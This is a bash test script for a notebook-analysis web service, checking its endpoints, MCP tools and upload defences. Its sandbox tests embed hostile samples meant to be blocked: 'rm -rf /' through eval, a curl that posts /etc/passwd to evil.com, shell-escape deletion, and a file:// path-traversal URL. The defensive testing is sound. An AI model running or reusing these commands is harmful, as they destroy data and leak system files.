#!/bin/bash
# Unified test script for Notebook Analyzer
# Usage: ./test.sh [--quick] [--url <base_url>] [--help]

set -e  # Exit on any error unless explicitly handled

# Default configuration
DEFAULT_BASE_URL="http://localhost:8080"
TIMEOUT=90
QUICK_MODE=false
TEMP_DIR="/tmp/notebook_test_$$"
RESULTS_FILE="$TEMP_DIR/results.txt"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Counters
TOTAL_TESTS=0
PASSED_TESTS=0

# Parse command line arguments
BASE_URL="$DEFAULT_BASE_URL"
while [[ $# -gt 0 ]]; do
    case $1 in
        --quick|-q)
            QUICK_MODE=true
            shift
            ;;
        --url|-u)
            BASE_URL="$2"
            shift 2
            ;;
        --help|-h)
            echo "Notebook Analyzer Test Suite"
            echo "Usage: $0 [options]"
            echo ""
            echo "Options:"
            echo "  --quick, -q          Run quick tests only (health, security headers, MCP, NVIDIA Best Practices)"
            echo "  --url, -u <url>      Base URL to test against (default: $DEFAULT_BASE_URL)"
            echo "  --help, -h           Show this help message"
            echo ""
            echo "Examples:"
            echo "  $0                                    # Run all tests against localhost:8080"
            echo "  $0 --quick                           # Run quick tests only"
            echo "  $0 --url http://localhost:5000       # Test against different port"
            echo "  $0 --quick --url https://my-app.com  # Quick tests against remote server"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            echo "Use --help for usage information"
            exit 1
            ;;
    esac
done

# Cleanup function
cleanup() {
    rm -rf "$TEMP_DIR" 2>/dev/null || true
}
trap cleanup EXIT

# Setup temp directory
mkdir -p "$TEMP_DIR"

# Logging functions
log_result() {
    local name="$1"
    local passed="$2"
    local message="$3"
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    
    if [ "$passed" = "true" ]; then
        echo -e "${GREEN}✅ PASS${NC}: $name"
        PASSED_TESTS=$((PASSED_TESTS + 1))
    else
        echo -e "${RED}❌ FAIL${NC}: $name"
    fi
    
    if [ -n "$message" ]; then
        echo "   $message"
    fi
    
    echo "$name:$passed:$message" >> "$RESULTS_FILE"
}

# Check if required tools are available
check_dependencies() {
    local missing=""
    
    if ! command -v curl >/dev/null 2>&1; then
        missing="$missing curl"
    fi
    
    if ! command -v jq >/dev/null 2>&1; then
        missing="$missing jq"
    fi
    
    if [ -n "$missing" ]; then
        echo -e "${RED}❌ Missing required tools:$missing${NC}"
        echo "Please install them:"
        echo "  macOS: brew install curl jq"
        echo "  Ubuntu/Debian: apt-get install curl jq"
        echo "  CentOS/RHEL: yum install curl jq"
        exit 1
    fi
}

# Test functions
test_health_check() {
    local response_file="$TEMP_DIR/health_response"
    
    if curl -s -m 10 -o "$response_file" -w "%{http_code}" "$BASE_URL/" > "$TEMP_DIR/health_code" 2>/dev/null; then
        local http_code=$(cat "$TEMP_DIR/health_code")
        if [ "$http_code" = "200" ] && grep -q "Notebook Analyzer" "$response_file" 2>/dev/null; then
            log_result "Health Check" "true" "Web UI accessible"
            return 0
        else
            log_result "Health Check" "false" "Status: $http_code"
            return 1
        fi
    else
        log_result "Health Check" "false" "Connection failed"
        return 1
    fi
}

test_security_headers() {
    echo "🔒 Testing security headers..."
    local response_file="$TEMP_DIR/security_headers_response"
    
    # Get headers from the main page
    if curl -I -s -m 10 -o "$response_file" -w "%{http_code}" "$BASE_URL/" > "$TEMP_DIR/security_headers_code" 2>/dev/null; then
        local http_code=$(cat "$TEMP_DIR/security_headers_code")
        if [ "$http_code" = "200" ]; then
            local headers_content=$(cat "$response_file")
            
            # Check for essential security headers
            local csp_found=false
            local frame_options_found=false
            local content_type_options_found=false
            
            # Check Content Security Policy
            if echo "$headers_content" | grep -qi "content-security-policy:"; then
                csp_found=true
            fi
            
            # Check X-Frame-Options
            if echo "$headers_content" | grep -qi "x-frame-options:.*deny"; then
                frame_options_found=true
            fi
            
            # Check X-Content-Type-Options
            if echo "$headers_content" | grep -qi "x-content-type-options:.*nosniff"; then
                content_type_options_found=true
            fi
            
            # Evaluate results
            local passed_headers=0
            local total_headers=3
            
            if [ "$csp_found" = "true" ]; then
                ((passed_headers++))
            fi
            if [ "$frame_options_found" = "true" ]; then
                ((passed_headers++))
            fi
            if [ "$content_type_options_found" = "true" ]; then
                ((passed_headers++))
            fi
            
            if [ "$passed_headers" -eq "$total_headers" ]; then
                log_result "Security Headers" "true" "All security headers present ($passed_headers/$total_headers)"
                return 0
            else
                local missing=""
                if [ "$csp_found" = "false" ]; then missing="$missing CSP"; fi
                if [ "$frame_options_found" = "false" ]; then missing="$missing X-Frame-Options"; fi
                if [ "$content_type_options_found" = "false" ]; then missing="$missing X-Content-Type-Options"; fi
                log_result "Security Headers" "false" "Missing headers:$missing ($passed_headers/$total_headers found)"
                return 1
            fi
        else
            log_result "Security Headers" "false" "HTTP $http_code"
            return 1
        fi
    else
        log_result "Security Headers" "false" "Request failed"
        return 1
    fi
}

test_security_sandbox() {
    echo "🛡️ Testing security sandbox file upload protection..."
    
    # Test 1: Malicious notebook with subprocess calls
    cat > "$TEMP_DIR/malicious.ipynb" << 'EOF'
{
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "import subprocess\n",
        "subprocess.call([\"rm\", \"-rf\", \"/tmp\"])"
      ]
    }
  ],
  "metadata": {},
  "nbformat": 4,
  "nbformat_minor": 4
}
EOF
    
    local response_file="$TEMP_DIR/sandbox_response"
    local http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
        -F "file=@$TEMP_DIR/malicious.ipynb" \
        "$BASE_URL/api/analyze" 2>/dev/null)
    
    if [ "$http_code" = "400" ]; then
        local response_content=$(cat "$response_file" 2>/dev/null)
        if echo "$response_content" | grep -qi "security\|blocked\|dangerous"; then
            log_result "Security Sandbox - Subprocess Block" "true" "Malicious subprocess call blocked"
        else
            log_result "Security Sandbox - Subprocess Block" "false" "Unexpected error response: $response_content"
        fi
    else
        log_result "Security Sandbox - Subprocess Block" "false" "HTTP $http_code - Should have been blocked"
    fi
    
    # Test 2: Malicious notebook with eval() calls
    cat > "$TEMP_DIR/eval_malicious.ipynb" << 'EOF'
{
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "eval(\"import os; os.system('rm -rf /')\")"
      ]
    }
  ],
  "metadata": {},
  "nbformat": 4,
  "nbformat_minor": 4
}
EOF
    
    http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
        -F "file=@$TEMP_DIR/eval_malicious.ipynb" \
        "$BASE_URL/api/analyze" 2>/dev/null)
    
    if [ "$http_code" = "400" ]; then
        local response_content=$(cat "$response_file" 2>/dev/null)
        if echo "$response_content" | grep -qi "security\|blocked\|dangerous"; then
            log_result "Security Sandbox - Eval Block" "true" "Malicious eval call blocked"
        else
            log_result "Security Sandbox - Eval Block" "false" "Unexpected error response: $response_content"
        fi
    else
        log_result "Security Sandbox - Eval Block" "false" "HTTP $http_code - Should have been blocked"
    fi
    
    # Test 3: Malicious Python file with os.system
    local malicious_python='import os
os.system("curl -X POST http://evil.com/steal -d @/etc/passwd")'
    echo "$malicious_python" > "$TEMP_DIR/malicious.py"
    
    http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
        -F "file=@$TEMP_DIR/malicious.py" \
        "$BASE_URL/api/analyze" 2>/dev/null)
    
    if [ "$http_code" = "400" ]; then
        local response_content=$(cat "$response_file" 2>/dev/null)
        if echo "$response_content" | grep -qi "security\|blocked\|dangerous"; then
            log_result "Security Sandbox - OS System Block" "true" "Malicious os.system call blocked"
        else
            log_result "Security Sandbox - OS System Block" "false" "Unexpected error response: $response_content"
        fi
    else
        log_result "Security Sandbox - OS System Block" "false" "HTTP $http_code - Should have been blocked"
    fi
    
    # Test 4: File with shell injection patterns
    cat > "$TEMP_DIR/shell_injection.ipynb" << 'EOF'
{
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "!rm -rf /tmp/*"
      ]
    }
  ],
  "metadata": {},
  "nbformat": 4,
  "nbformat_minor": 4
}
EOF
    
    http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
        -F "file=@$TEMP_DIR/shell_injection.ipynb" \
        "$BASE_URL/api/analyze" 2>/dev/null)
    
    if [ "$http_code" = "400" ]; then
        local response_content=$(cat "$response_file" 2>/dev/null)
        if echo "$response_content" | grep -qi "security\|blocked\|dangerous"; then
            log_result "Security Sandbox - Shell Injection Block" "true" "Shell injection pattern blocked"
        else
            log_result "Security Sandbox - Shell Injection Block" "false" "Unexpected error response: $response_content"
        fi
    else
        log_result "Security Sandbox - Shell Injection Block" "false" "HTTP $http_code - Should have been blocked"
    fi
    
    # Test 5: Test that legitimate files still work
    cat > "$TEMP_DIR/legitimate.ipynb" << 'EOF'
{
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "import torch",
        "model = torch.nn.Linear(10, 1)",
        "print('Hello World')"
      ]
    }
  ],
  "metadata": {},
  "nbformat": 4,
  "nbformat_minor": 4
}
EOF
    
          http_code=$(curl -s -m 90 -o "$response_file" -w "%{http_code}" \
          -F "file=@$TEMP_DIR/legitimate.ipynb" \
          "$BASE_URL/api/analyze" 2>/dev/null)
    
    if [ "$http_code" = "200" ]; then
        local response_content=$(cat "$response_file" 2>/dev/null)
        if echo "$response_content" | grep -qi "success.*true\|analysis"; then
            log_result "Security Sandbox - Legitimate File" "true" "Legitimate notebook processed successfully"
        else
            log_result "Security Sandbox - Legitimate File" "false" "Unexpected response: $response_content"
        fi
    else
        log_result "Security Sandbox - Legitimate File" "false" "HTTP $http_code - Legitimate file should work"
    fi
}

test_file_type_validation() {
    echo "📁 Testing file type validation..."
    
    # Test 1: Non-Python/non-notebook file rejection
    echo "This is not a Python or notebook file" > "$TEMP_DIR/malicious.txt"
    
    local response_file="$TEMP_DIR/filetype_response"
    local http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
        -F "file=@$TEMP_DIR/malicious.txt" \
        "$BASE_URL/api/analyze" 2>/dev/null)
    
    if [ "$http_code" = "400" ]; then
        local response_content=$(cat "$response_file" 2>/dev/null)
        if echo "$response_content" | grep -qi "invalid.*file.*type"; then
            log_result "File Type Validation - TXT Rejection" "true" "Non-Python/notebook files rejected"
        else
            log_result "File Type Validation - TXT Rejection" "false" "Unexpected error: $response_content"
        fi
    else
        log_result "File Type Validation - TXT Rejection" "false" "HTTP $http_code - Should reject .txt files"
    fi
    
    # Test 2: Binary file with .py extension
    echo -e "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A" > "$TEMP_DIR/fake.py"  # PNG header
    
    http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
        -F "file=@$TEMP_DIR/fake.py" \
        "$BASE_URL/api/analyze" 2>/dev/null)
    
    if [ "$http_code" = "400" ]; then
        local response_content=$(cat "$response_file" 2>/dev/null)
        if echo "$response_content" | grep -qi "encoding\|utf-8"; then
            log_result "File Type Validation - Binary Rejection" "true" "Binary files with Python extension rejected"
        else
            log_result "File Type Validation - Binary Rejection" "false" "Unexpected error: $response_content"
        fi
    else
        log_result "File Type Validation - Binary Rejection" "false" "HTTP $http_code - Should reject binary files"
    fi
}

test_path_traversal_protection() {
    echo "🔍 Testing path traversal protection..."
    
    # Test URL parameter injection
    local response_file="$TEMP_DIR/traversal_response"
    local malicious_url="file://../../../etc/passwd"
    
    local http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
        -d "url=$malicious_url" \
        "$BASE_URL/api/analyze" 2>/dev/null)
    
    if [ "$http_code" = "400" ] || [ "$http_code" = "500" ]; then
        local response_content=$(cat "$response_file" 2>/dev/null)
        if ! echo "$response_content" | grep -qi "root:"; then
            log_result "Path Traversal Protection" "true" "Local file access blocked"
        else
            log_result "Path Traversal Protection" "false" "CRITICAL: Local file access possible!"
        fi
    else
        log_result "Path Traversal Protection" "false" "HTTP $http_code - Should block file:// URLs"
    fi
}

test_dos_protection() {
    echo "⚡ Testing DoS protection..."
    
    # Test 1: Large file upload
    dd if=/dev/zero of="$TEMP_DIR/large.ipynb" bs=1M count=10 2>/dev/null
    
    local response_file="$TEMP_DIR/dos_response"
    local http_code=$(timeout 10 curl -s -m 10 -o "$response_file" -w "%{http_code}" \
        -F "file=@$TEMP_DIR/large.ipynb" \
        "$BASE_URL/api/analyze" 2>/dev/null)
    
    if [ "$http_code" = "400" ] || [ "$http_code" = "413" ] || [ "$http_code" = "500" ]; then
        log_result "DoS Protection - Large File" "true" "Large file uploads rejected/handled (HTTP $http_code)"
    else
        log_result "DoS Protection - Large File" "false" "HTTP $http_code - Large files should be limited"
    fi
    
    # Test 2: Rapid requests (simple rate limiting test)
    local success_count=0
    for i in {1..5}; do
        local quick_response=$(curl -s -m 2 -w "%{http_code}" -o /dev/null "$BASE_URL/" 2>/dev/null)
        if [ "$quick_response" = "200" ]; then
            ((success_count++))
        fi
    done
    
    if [ "$success_count" -gt 0 ] && [ "$success_count" -le 5 ]; then
        log_result "DoS Protection - Rate Limiting" "true" "Rapid requests handled ($success_count/5 successful)"
    else
        log_result "DoS Protection - Rate Limiting" "false" "Unexpected behavior: $success_count/5 requests successful"
    fi
}

test_mcp_tools_list() {
    local payload='{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
    local response_file="$TEMP_DIR/mcp_tools_response"
    
    if curl -s -m "$TIMEOUT" -o "$response_file" -w "%{http_code}" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        "$BASE_URL/mcp" > "$TEMP_DIR/mcp_tools_code" 2>/dev/null; then
        
        local http_code=$(cat "$TEMP_DIR/mcp_tools_code")
        if [ "$http_code" = "200" ]; then
            if jq -e '.result.tools' "$response_file" >/dev/null 2>&1; then
                local tool_count=$(jq '.result.tools | length' "$response_file")
                local tool_names=$(jq -r '.result.tools[].name' "$response_file" | tr '\n' ' ')
                
                if echo "$tool_names" | grep -q "analyze_notebook" && echo "$tool_names" | grep -q "get_gpu_recommendations"; then
                    log_result "MCP Tools List" "true" "Found $tool_count tools: $tool_names"
                    return 0
                else
                    log_result "MCP Tools List" "false" "Missing expected tools. Found: $tool_names"
                    return 1
                fi
            else
                log_result "MCP Tools List" "false" "Invalid response format"
                return 1
            fi
        else
            log_result "MCP Tools List" "false" "HTTP $http_code"
            return 1
        fi
    else
        log_result "MCP Tools List" "false" "Request failed"
        return 1
    fi
}

test_mcp_gpu_recommendations() {
    local payload='{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"get_gpu_recommendations","arguments":{"workload_type":"training","model_size":"large","batch_size":32}}}'
    local response_file="$TEMP_DIR/mcp_gpu_response"
    
    if curl -s -m "$TIMEOUT" -o "$response_file" -w "%{http_code}" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        "$BASE_URL/mcp" > "$TEMP_DIR/mcp_gpu_code" 2>/dev/null; then
        
        local http_code=$(cat "$TEMP_DIR/mcp_gpu_code")
        if [ "$http_code" = "200" ]; then
            if jq -e '.result.content[0].text' "$response_file" >/dev/null 2>&1; then
                local content=$(jq -r '.result.content[0].text' "$response_file")
                if echo "$content" | grep -q "GPU:" && echo "$content" | grep -q "Quantity:"; then
                    local preview=$(echo "$content" | head -c 100)
                    log_result "MCP GPU Recommendations" "true" "Response: $preview..."
                    return 0
                else
                    log_result "MCP GPU Recommendations" "false" "Invalid content format"
                    return 1
                fi
            else
                log_result "MCP GPU Recommendations" "false" "Invalid response structure"
                return 1
            fi
        else
            log_result "MCP GPU Recommendations" "false" "HTTP $http_code"
            return 1
        fi
    else
        log_result "MCP GPU Recommendations" "false" "Request failed"
        return 1
    fi
}

test_jupyter_analysis() {
    if [ ! -f "examples/jupyter_example.ipynb" ]; then
        log_result "Jupyter Analysis" "false" "Example file not found"
        return 1
    fi
    
    local notebook_content=$(cat "examples/jupyter_example.ipynb" | jq -c .)
    local payload="{\"jsonrpc\":\"2.0\",\"id\":3,\"method\":\"tools/call\",\"params\":{\"name\":\"analyze_notebook\",\"arguments\":{\"notebook_content\":$notebook_content,\"source_info\":\"jupyter_example.ipynb\"}}}"
    local response_file="$TEMP_DIR/jupyter_response"
    
    if curl -s -m "$TIMEOUT" -o "$response_file" -w "%{http_code}" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        "$BASE_URL/mcp" > "$TEMP_DIR/jupyter_code" 2>/dev/null; then
        
        local http_code=$(cat "$TEMP_DIR/jupyter_code")
        if [ "$http_code" = "200" ]; then
            if jq -e '.result.content[0].text' "$response_file" >/dev/null 2>&1; then
                local content=$(jq -r '.result.content[0].text' "$response_file")
                if echo "$content" | grep -q "GPU" && (echo "$content" | grep -qi "recommendation\|analysis"); then
                    log_result "Jupyter Analysis" "true" "Analysis completed successfully"
                    return 0
                else
                    log_result "Jupyter Analysis" "false" "Invalid analysis content"
                    return 1
                fi
            else
                log_result "Jupyter Analysis" "false" "Invalid response structure"
                return 1
            fi
        else
            log_result "Jupyter Analysis" "false" "HTTP $http_code"
            return 1
        fi
    else
        log_result "Jupyter Analysis" "false" "Request failed"
        return 1
    fi
}

test_marimo_analysis() {
    if [ ! -f "examples/marimo_example.py" ]; then
        log_result "Marimo Analysis" "false" "Example file not found"
        return 1
    fi
    
    echo "🐍 Testing marimo analysis (this may take up to 90 seconds due to self-review)..."
    
    # Use Python to properly handle Unicode and JSON encoding
    local response_file="$TEMP_DIR/marimo_response"
    
    # Create a temporary Python script to handle the request properly
    cat > "$TEMP_DIR/marimo_test.py" << 'EOF'
import json
import requests
import sys

try:
    # Read the marimo file content
    marimo_path = sys.argv[3] if len(sys.argv) > 3 else 'examples/marimo_example.py'
    with open(marimo_path, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Create the proper JSON payload
    payload = {
        'jsonrpc': '2.0',
        'id': 4,
        'method': 'tools/call',
        'params': {
            'name': 'analyze_notebook',
            'arguments': {
                'notebook_content': content,
                'source_info': 'marimo_example.py'
            }
        }
    }
    
    # Send the request with longer timeout for complex marimo files and self-review
    response = requests.post(sys.argv[1], json=payload, timeout=90)
    print(response.status_code)
    
    # Write response to file
    with open(sys.argv[2], 'w', encoding='utf-8') as f:
        f.write(response.text)
        
except Exception as e:
    print(f"Error: {e}")
    sys.exit(1)
EOF
    
    if python3 "$TEMP_DIR/marimo_test.py" "$BASE_URL/mcp" "$response_file" "examples/marimo_example.py" > "$TEMP_DIR/marimo_code" 2>/dev/null; then
        
        local http_code=$(cat "$TEMP_DIR/marimo_code")
        if [ "$http_code" = "200" ]; then
            if jq -e '.result.content[0].text' "$response_file" >/dev/null 2>&1; then
                local content=$(jq -r '.result.content[0].text' "$response_file")
                if echo "$content" | grep -q "GPU" && (echo "$content" | grep -qi "recommendation\|analysis"); then
                    log_result "Marimo Analysis" "true" "Analysis completed successfully"
                    return 0
                else
                    log_result "Marimo Analysis" "false" "Invalid analysis content"
                    return 1
                fi
            else
                log_result "Marimo Analysis" "false" "Invalid response structure"
                return 1
            fi
        else
            log_result "Marimo Analysis" "false" "HTTP $http_code"
            return 1
        fi
    else
        log_result "Marimo Analysis" "false" "Request failed"
        return 1
    fi
}

test_streaming_endpoint() {
    if [ ! -f "examples/jupyter_example.ipynb" ]; then
        log_result "Streaming Analysis" "false" "Example file not found"
        return 1
    fi
    
    local response_file="$TEMP_DIR/streaming_response"
    local timeout_for_streaming=90  # Increased timeout for self-review feature
    
    # Test streaming endpoint - handle both success and timeout cases
    local curl_exit_code=0
    curl -s -m "$timeout_for_streaming" -D "$TEMP_DIR/streaming_headers" -o "$response_file" -w "%{http_code}" \
        -F "file=@examples/jupyter_example.ipynb" \
        -F "analysis_type=basic" \
        "$BASE_URL/analyze-stream" > "$TEMP_DIR/streaming_code" 2>/dev/null
    curl_exit_code=$?
    
    local http_code=$(cat "$TEMP_DIR/streaming_code" 2>/dev/null || echo "000")
    
    # Check if we got streaming data (success case OR timeout with partial data)
    if [ "$curl_exit_code" -eq 0 ] || [ "$curl_exit_code" -eq 28 ]; then  # 0 = success, 28 = timeout
        if [ "$http_code" = "200" ] || [ "$curl_exit_code" -eq 28 ]; then
            # Check for Server-Sent Events headers
            if [ -f "$TEMP_DIR/streaming_headers" ] && grep -qi "content-type.*text/event-stream" "$TEMP_DIR/streaming_headers" 2>/dev/null; then
                # Check for SSE data format in response (even partial)
                local content=$(cat "$response_file" 2>/dev/null || echo "")
                if echo "$content" | grep -q "data:" && (echo "$content" | grep -qi "progress\|starting\|analysis"); then
                    if [ "$curl_exit_code" -eq 28 ]; then
                        log_result "Streaming Analysis" "true" "SSE streaming works (partial data due to timeout)"
                    else
                        log_result "Streaming Analysis" "true" "SSE streaming completed successfully"
                    fi
                    return 0
                else
                    log_result "Streaming Analysis" "true" "SSE endpoint working (headers confirmed)"
                    return 0
                fi
            else
                log_result "Streaming Analysis" "false" "Missing SSE headers"
                return 1
            fi
        else
            log_result "Streaming Analysis" "false" "HTTP $http_code"
            return 1
        fi
    else
        log_result "Streaming Analysis" "false" "Request failed (curl exit: $curl_exit_code)"
        return 1
    fi
}

test_web_form_analysis() {
    if [ ! -f "examples/jupyter_example.ipynb" ]; then
        log_result "Web Form Analysis" "false" "Example file not found"
        return 1
    fi
    
    local response_file="$TEMP_DIR/webform_response"
    
    # Use -L flag to follow redirects since /analyze now redirects to streaming interface
    if curl -s -L -m "$TIMEOUT" -o "$response_file" -w "%{http_code}" \
        -F "file=@examples/jupyter_example.ipynb" \
        -F "analysis_type=basic" \
        "$BASE_URL/analyze" > "$TEMP_DIR/webform_code" 2>/dev/null; then
        
        local http_code=$(cat "$TEMP_DIR/webform_code")
        if [ "$http_code" = "200" ]; then
            local content=$(cat "$response_file")
            # Check for streaming interface content and analysis data
            if echo "$content" | grep -q "GPU" && (echo "$content" | grep -qi "recommendation\|analysis\|streaming"); then
                log_result "Web Form Analysis" "true" "File upload and analysis working"
                return 0
            else
                log_result "Web Form Analysis" "false" "Analysis results not found"
                return 1
            fi
        else
            log_result "Web Form Analysis" "false" "HTTP $http_code"
            return 1
        fi
    else
        log_result "Web Form Analysis" "false" "Request failed"
        return 1
    fi
}

test_nvidia_best_practices() {
    # Check if Python script exists
    if [ ! -f "notebook-analyzer.py" ]; then
        log_result "NVIDIA Best Practices - Script" "false" "notebook-analyzer.py not found"
        return 1
    fi
    
    # Check for virtual environment and activate if available
    local python_cmd="python3"
    local venv_activated=false
    
    # Check if we have a virtual environment in the current directory
    if [ -f "bin/activate" ] && [ -z "$VIRTUAL_ENV" ]; then
        echo "   Activating virtual environment..."
        source bin/activate
        venv_activated=true
    fi
    
    # Determine Python command
    if ! command -v python3 >/dev/null 2>&1; then
        if command -v python >/dev/null 2>&1; then
            python_cmd="python"
        else
            log_result "NVIDIA Best Practices - Python" "false" "Python not available"
            return 1
        fi
    fi
    
    # Check if we can import required modules
    if ! $python_cmd -c "import json, sys" >/dev/null 2>&1; then
        log_result "NVIDIA Best Practices - Environment" "false" "Python environment not properly configured"
        return 1
    fi
    
    # Test basic CLI functionality
    local basic_output="$TEMP_DIR/nvidia_basic_output"
    if [ -f "examples/jupyter_example.ipynb" ]; then
        local test_file="examples/jupyter_example.ipynb"
    else
        # Use a public notebook if local example not available
        local test_file="https://raw.githubusercontent.com/fastai/fastbook/master/01_intro.ipynb"
    fi
    
    # Test basic analysis
    echo "   Testing basic NVIDIA analysis..."
    if $python_cmd notebook-analyzer.py "$test_file" > "$basic_output" 2>&1; then
        if grep -q "NVIDIA NOTEBOOK COMPLIANCE" "$basic_output" && grep -q "GPU REQUIREMENTS" "$basic_output"; then
            log_result "NVIDIA Best Practices - Basic Analysis" "true" "CLI analysis working with NVIDIA features"
        else
            log_result "NVIDIA Best Practices - Basic Analysis" "false" "NVIDIA features not found in output"
            return 1
        fi
    else
        log_result "NVIDIA Best Practices - Basic Analysis" "false" "CLI execution failed"
        return 1
    fi
    
    # Test verbose mode (ensure virtual env is still active)
    local verbose_output="$TEMP_DIR/nvidia_verbose_output"
    echo "   Testing verbose NVIDIA analysis..."
    
    # Re-activate virtual environment if needed
    if [ "$venv_activated" = "true" ] && [ -z "$VIRTUAL_ENV" ]; then
        source bin/activate
    fi
    
    if $python_cmd notebook-analyzer.py --verbose "$test_file" > "$verbose_output" 2>&1; then
        if grep -q "NVIDIA Best Practices Summary" "$verbose_output" && grep -q "compliance" "$verbose_output"; then
            log_result "NVIDIA Best Practices - Verbose Mode" "true" "Verbose analysis working"
        else
            log_result "NVIDIA Best Practices - Verbose Mode" "false" "Verbose NVIDIA features not found"
            return 1
        fi
    else
        log_result "NVIDIA Best Practices - Verbose Mode" "false" "Verbose mode execution failed"
        return 1
    fi
    
    # Test JSON output
    local json_output="$TEMP_DIR/nvidia_json_output"
    echo "   Testing JSON output with NVIDIA data..."
    if $python_cmd notebook-analyzer.py --json "$test_file" > "$json_output" 2>&1; then
        if command -v jq >/dev/null 2>&1; then
            # Validate JSON structure with jq if available
            if jq -e '.nvidia_compliance_score' "$json_output" >/dev/null 2>&1; then
                log_result "NVIDIA Best Practices - JSON Output" "true" "JSON output contains NVIDIA compliance data"
            else
                log_result "NVIDIA Best Practices - JSON Output" "false" "JSON missing NVIDIA compliance data"
                return 1
            fi
        else
            # Basic JSON validation without jq
            if grep -q '"nvidia_compliance_score"' "$json_output"; then
                log_result "NVIDIA Best Practices - JSON Output" "true" "JSON output contains NVIDIA data (basic validation)"
            else
                log_result "NVIDIA Best Practices - JSON Output" "false" "JSON missing NVIDIA data"
                return 1
            fi
        fi
    else
        log_result "NVIDIA Best Practices - JSON Output" "false" "JSON mode execution failed"  
        return 1
    fi
    
    # Test core module availability
    if $python_cmd -c "from analyzer.core import NVIDIABestPracticesLoader, GPUAnalyzer; print('Core modules available')" > /dev/null 2>&1; then
        log_result "NVIDIA Best Practices - Core Modules" "true" "Enhanced analyzer modules available"
    else
        log_result "NVIDIA Best Practices - Core Modules" "false" "Core modules import failed"
        return 1
    fi
    
    # Check if best practices guidelines file exists
    if [ -f "analyzer/nvidia_best_practices.md" ]; then
        log_result "NVIDIA Best Practices - Guidelines File" "true" "Best practices guidelines available"
    else
        log_result "NVIDIA Best Practices - Guidelines File" "false" "Guidelines file missing"
        return 1
    fi
    
    return 0
}

run_tests() {
    echo -e "${BLUE}🚀 Starting Notebook Analyzer Tests${NC}"
    if [ "$QUICK_MODE" = "true" ]; then
        echo -e "${YELLOW}⚡ Quick Mode: Running essential tests only${NC}"
    fi
    echo "=================================================="
    echo "Testing against: $BASE_URL"
    echo ""
    
    # Check dependencies first
    check_dependencies
    
    # Core functionality tests (always run)
    if ! test_health_check; then
        echo -e "\n${RED}❌ Health check failed - skipping other tests${NC}"
        return 1
    fi
    
    # Security tests (always run - critical for production)
    test_security_headers
    test_security_sandbox
    test_file_type_validation
    test_path_traversal_protection
    test_dos_protection
    
    # MCP tests (always run)
    test_mcp_tools_list
    test_mcp_gpu_recommendations
    
    # NVIDIA Best Practices CLI tests (always run)
    echo "🎯 Testing NVIDIA Best Practices CLI functionality..."
    test_nvidia_best_practices
    
    if [ "$QUICK_MODE" = "false" ]; then
        # Full analysis tests (only in full mode)
        test_jupyter_analysis
        test_marimo_analysis
        
        # Web interface tests (only in full mode)
        test_streaming_endpoint
        test_web_form_analysis
    fi
    
    # Summary
    echo
    echo "=================================================="
    echo -e "${BLUE}📊 Test Results: $PASSED_TESTS/$TOTAL_TESTS passed${NC}"
    
    if [ "$PASSED_TESTS" -eq "$TOTAL_TESTS" ]; then
        echo -e "${GREEN}🎉 All tests passed! System is fully functional.${NC}"
        echo "✅ Verified components:"
        echo "   • Web interface and API endpoints"
        echo "   • Security headers and safety features"
        echo "   • MCP (Model Context Protocol) integration"
        echo "   • NVIDIA Best Practices CLI functionality"
        if [ "$QUICK_MODE" = "false" ]; then
            echo "   • Full notebook analysis capabilities"
            echo "   • Streaming analysis and web forms"
        fi
        return 0
    else
        echo -e "${YELLOW}⚠️  Some tests failed. Check the issues above.${NC}"
        local failed_tests=$(grep ":false:" "$RESULTS_FILE" | cut -d':' -f1 | tr '\n' ' ')
        echo "Failed tests: $failed_tests"
        return 1
    fi
}

main() {
    echo "Notebook Analyzer - Test Suite"
    if [ "$QUICK_MODE" = "true" ]; then
        echo "Mode: Quick Tests"
    else
        echo "Mode: Full Test Suite"
    fi
    echo "Target: $BASE_URL"
    echo
    
    if run_tests; then
        exit 0
    else
        exit 1
    fi
}

main "$@" 